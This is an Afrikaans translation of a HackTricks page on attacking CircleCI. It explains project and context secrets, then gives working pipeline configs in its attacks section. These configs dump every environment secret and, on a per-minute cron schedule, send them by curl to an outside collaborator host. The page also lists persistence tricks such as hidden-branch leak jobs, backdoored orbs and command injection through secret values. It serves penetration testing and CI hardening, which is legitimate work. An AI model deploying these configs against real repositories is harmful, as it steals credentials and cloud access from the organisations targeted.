# CircleCI Sekuriteit

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/) is 'n Continuous Integration-platform waar jy **sjablone kan definieer** wat aandui wat jy wil h√™ dit moet doen met 'n bietjie kode en wanneer dit moet gebeur. Op hierdie manier kan jy toetse outomatiseer of implementering direk **vanaf jou repo se hooftak** byvoorbeeld.

## Toestemmings

**CircleCI** **erf die toestemmings** van github en bitbucket wat verband hou met die **rekening** wat aanmeld.\
In my toetsing het ek bevind dat solank jy **skryftoestemmings oor die repo in github** het, sal jy in staat wees om **sy projekinstellings in CircleCI te bestuur** (nuwe ssh-sleutels instel, projek-api-sleutels kry, nuwe takke met nuwe CircleCI-konfigurasies skep...).

Jy moet egter 'n **repo-admin** wees om die repo in 'n CircleCI-projek te omskep.

## Env-variabele & Geheime

Volgens [**die dokumentasie**](https://circleci.com/docs/2.0/env-vars/) is daar verskillende maniere om waardes in omgewingsveranderlikes in 'n werkstroom te **laai**.

### Ingeboude env-variabele

Elke houer wat deur CircleCI uitgevoer word, sal altyd [**spesifieke env-variabele h√™ wat in die dokumentasie gedefinieer is**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables) soos `CIRCLE_PR_USERNAME`, `CIRCLE_PROJECT_REPONAME` of `CIRCLE_USERNAME`.

### Duidelike teks

Jy kan hulle in duidelike teks verklaar binne 'n **opdrag**:
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
Jy kan hulle in duidelike teks verklaar binne die **uitvoeringsomgewing**:
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
Jy kan hulle in duidelike teks verklaar binne die **build-job omgewing**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
Jy kan hulle in duidelike teks verklaar binne die **omgewing van 'n houer**:
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### Projek Geheime

Dit is **geheime** wat slegs deur die **projek** (deur **enige tak**) toeganklik sal wees.\
Jy kan hulle sien **verklaar in** _https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
Die "**Invoer Veranderlikes**" funksionaliteit maak dit moontlik om **veranderlikes van ander projekte** na hierdie een in te voer.
{% endhint %}

### Konteks Geheime

Dit is geheime wat **organisasie-wyd** is. Standaard sal **enige repo** toegang h√™ tot enige geheim wat hier gestoor word:

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
Let egter daarop dat 'n ander groep (in plaas van Alle lede) gekies kan word om slegs toegang tot die geheime aan spesifieke persone te gee.\
Dit is tans een van die beste maniere om die veiligheid van die geheime te **verhoog**, om nie almal toegang daartoe te gee nie, maar net sommige mense.
{% endhint %}

## Aanvalle

### Soek Duidelike Teks Geheime

As jy **toegang het tot die VCS** (soos github), kyk na die l√™er `.circleci/config.yml` van **elke repo op elke tak** en **soek** vir potensi√´le **duidelike teks geheime** wat daar gestoor word.

### Geheime Env Veranderlikes & Konteks opname

Deur die kode te ondersoek, kan jy **alle geheimname** vind wat in elke `.circleci/config.yml` l√™er gebruik word. Jy kan ook die **konteksname** uit daardie l√™ers kry of dit in die webkonsol nakyk: _https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_.

### Uitlek van Projekgeheime

{% hint style="warning" %}
Om **AL** die projek- en konteks-**GEHEIME** uit te lek, het jy slegs **SKRYF** toegang tot **slegs 1 repo** in die hele github organisasie nodig (_en jou rekening moet toegang tot die kontekste h√™, maar standaard kan almal toegang tot elke konteks kry_).
{% endhint %}

{% hint style="danger" %}
Die "**Invoer Veranderlikes**" funksionaliteit maak dit moontlik om **veranderlikes van ander projekte** na hierdie een in te voer. 'n Aanvaller kan dus **alle projekveranderlikes van al die repos** invoer en dan **almal saam uitlek**.
{% endhint %}

Al die projekgeheime word altyd in die omgewing van die take ingestel, dus deur net die omgewing te roep en dit in base64 te versteek, sal die geheime in die **werkstroom web-logkonsol** uitlek:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
As jy **nie toegang tot die webkonsol** het nie, maar jy het **toegang tot die repo** en jy weet dat CircleCI gebruik word, kan jy net 'n **werkstroom skep** wat **elke minuut geaktiveer word** en wat die geheime na 'n eksterne adres **uitlees**.
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### Uitlek van Konteksgeheime

Jy moet die **konteksnaam spesifiseer** (dit sal ook die projekgeheime uitlek):
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
As jy **nie toegang tot die webkonsol** het nie, maar jy het **toegang tot die repo** en jy weet dat CircleCI gebruik word, kan jy net 'n **werkstroom wysig** wat **elke minuut geaktiveer word** en wat die geheime na 'n eksterne adres **uitlek**:
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
Net die skep van 'n nuwe `.circleci/config.yml` in 'n repo is nie genoeg om 'n CircleCI-bou te trigger nie. Jy moet dit as 'n projek in die CircleCI-konsole aktiveer.
{% endhint %}

### Ontsnapping na die Wolk

CircleCI bied jou die opsie om jou bouwerk in hul masjiene of in jou eie masjiene uit te voer.\
Standaard is hul masjiene gele√´ in GCP, en aanvanklik sal jy nie enige relevante inligting vind nie. Maar as 'n slagoffer die take in hul eie masjiene (moontlik in 'n wolkomgewing) uitvoer, kan jy 'n wolkmetadata-eindpunt met interessante inligting daarop vind.

Let daarop dat in die vorige voorbeelde alles binne 'n Docker-houer uitgevoer is, maar jy kan ook vra om 'n VM-masjien te laat uitvoer (wat verskillende wolktoestemmings kan h√™):
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
Of selfs 'n Docker-houer met toegang tot 'n afgele√´ Docker-diens:
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### Volharding

* Dit is moontlik om **gebruikerstokens in CircleCI te skep** om toegang tot die API-eindpunte te verkry met die gebruikers se toegang.
* _https://app.circleci.com/settings/user/tokens_
* Dit is moontlik om **projekstokens te skep** om toegang tot die projek te verkry met die toestemmings wat aan die token gegee is.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* Dit is moontlik om **SSH-sleutels by die projekte te voeg**.
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* Dit is moontlik om **'n cron-werk in 'n verborge tak** in 'n onverwagte projek te skep wat elke dag alle **konteksomgewingsveranderlikes lek**.
* Of selfs 'n tak in 'n tak / wysig 'n bekende taak wat elke dag alle konteks en **projekgeheime lek**.
* As jy 'n GitHub-eienaar is, kan jy **onverifieerde orbs toelaat** en een in 'n taak as **agterdeur** konfigureer.
* Jy kan 'n **opdraginjeksiekwesbaarheid** in 'n sekere taak vind en opdragte **inspuit** via 'n **geheim** deur sy waarde te wysig.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
